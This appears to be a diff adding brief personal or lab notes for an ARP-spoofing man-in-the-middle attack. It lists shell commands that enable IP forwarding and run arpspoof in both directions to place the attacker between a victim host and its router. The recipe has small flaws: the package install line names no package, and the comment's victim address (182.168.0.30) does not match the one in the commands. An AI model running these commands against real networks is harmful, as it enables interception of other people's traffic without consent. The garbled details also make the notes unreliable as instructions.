@@ -1,0 +1,13 @@
+# Need to install dsniff on kali to get access to arpspoof module
+
+sudo apt-get install 
+
+# We will need to also enable IP forwarding to route packets from victim to internet.
+
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Trick the victim 182.168.0.30 into thinking we are the router 192.168.0.1
+arpspoof -i eth0 -t 192.168.0.30 192.168.0.1
+
+# Trick the router to think we are the victim in another terminal
+arpspoof -i eth0 -t 192.168.0.1 192.168.0.30
